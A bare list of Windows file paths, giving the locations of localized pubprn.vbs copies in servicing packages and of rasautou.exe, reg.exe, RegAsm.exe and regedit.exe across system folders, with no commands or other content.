Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_fe8a2f40113f0680\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_45faaf87f59ed59c\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_45faaf87f59ed59c\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_e8b22586e870ebfe\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_e8b22586e870ebfe\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_8ad7a493db8bfdd9\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_8ad7a493db8bfdd9\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_2e418148cdfcc4ef\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_2e418148cdfcc4ef\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_16d4027da621f0ab\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_16d4027da621f0ab\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_15134dbba74dfa80\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_15134dbba74dfa80\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_5b4fa83d8c706834\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_5b4fa83d8c706834\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-br_5da392e18af9fc18\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-br_5da392e18af9fc18\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_5e85624d8a696bf4\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_5e85624d8a696bf4\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_a52874116f4afa20\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_a52874116f4afa20\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_41235e866674047b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_41235e866674047b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_ea30a8cd5530066c\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_ea30a8cd5530066c\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_bb8dc6cb0567d88b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_bb8dc6cb0567d88b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_bf8a042102d8b4fb\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_bf8a042102d8b4fb\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_2305bb536bac6416\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_2305bb536bac6416\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_c03f9b7a61f26015\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_c03f9b7a61f26015\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_bd6b30b663c8b4af\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_bd6b30b663c8b4af\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_66015e4952de1d3d\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_66015e4952de1d3d\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_6627639352cdb219\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_6627639352cdb219\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_0542684047e7a443\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_0542684047e7a443\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_08ded992459fc87b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_08ded992459fc87b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_504f59da29ff9797\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_504f59da29ff9797\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_f306cfd91cd1adf9\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_f306cfd91cd1adf9\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_952c4ee60fecbfd4\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_952c4ee60fecbfd4\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_38962b9b025d86ea\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_38962b9b025d86ea\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_2128accfda82b2a6\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_2128accfda82b2a6\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_1f67f80ddbaebc7b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_1f67f80ddbaebc7b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_65a4528fc0d12a2f\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_65a4528fc0d12a2f\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-br_67f83d33bf5abe13\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-br_67f83d33bf5abe13\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_68da0c9fbeca2def\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_68da0c9fbeca2def\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_af7d1e63a3abbc1b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_af7d1e63a3abbc1b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_4b7808d89ad4c676\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_4b7808d89ad4c676\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_f485531f8990c867\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_f485531f8990c867\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_c5e2711d39c89a86\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_c5e2711d39c89a86\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_c9deae73373976f6\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_c9deae73373976f6\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_bc92757d7eee30e5\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_bc92757d7eee30e5\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_59cc55a475342ce4\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_59cc55a475342ce4\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_56f7eae0770a817e\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_56f7eae0770a817e\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_ff8e1873661fea0c\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_ff8e1873661fea0c\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_ffb41dbd660f7ee8\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_ffb41dbd660f7ee8\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_9ecf226a5b297112\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_9ecf226a5b297112\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_a26b93bc58e1954a\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_a26b93bc58e1954a\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_e9dc14043d416466\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_e9dc14043d416466\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_8c938a0330137ac8\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_8c938a0330137ac8\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_2eb90910232e8ca3\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_2eb90910232e8ca3\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_d222e5c5159f53b9\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_d222e5c5159f53b9\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_bab566f9edc47f75\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_bab566f9edc47f75\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_b8f4b237eef0894a\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_b8f4b237eef0894a\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_ff310cb9d412f6fe\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_ff310cb9d412f6fe\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-br_0184f75dd29c8ae2\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-br_0184f75dd29c8ae2\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_0266c6c9d20bfabe\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_0266c6c9d20bfabe\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_4909d88db6ed88ea\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ru-ru_4909d88db6ed88ea\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_e504c302ae169345\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_sv-se_e504c302ae169345\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_8e120d499cd29536\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_tr-tr_8e120d499cd29536\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_5f6f2b474d0a6755\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-cn_5f6f2b474d0a6755\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_636b689d4a7b43c5\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_zh-tw_636b689d4a7b43c5\r\pubprn.vbs
Path: C:\Windows\System32\rasautou.exe
Path: C:\Windows\SysWOW64\rasautou.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.17763.1_none_009fe89bbd7c8b5f\rasautou.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.17763.1_none_0af492edf1dd4d5a\rasautou.exe
Path: C:\Windows\System32\reg.exe
Path: C:\Windows\SysWOW64\reg.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.17763.1_none_225a1de282d8e4e1\reg.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.17763.1_none_2caec834b739a6dc\reg.exe
Path: C:\Windows\WinSxS\amd64_regasm_b03f5f7f11d50a3a_4.0.15713.0_none_703119e5038999ca\RegAsm.exe
Path: C:\Windows\WinSxS\x86_regasm_b03f5f7f11d50a3a_4.0.15713.0_none_b7de50bc1805c2d0\RegAsm.exe
PPath: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe
Path: C:\Windows\regedit.exe
Path: C:\Windows\SysWOW64\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_41a3ac4fadb97187\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1_none_e4f49f4a34021293\regedit.exe
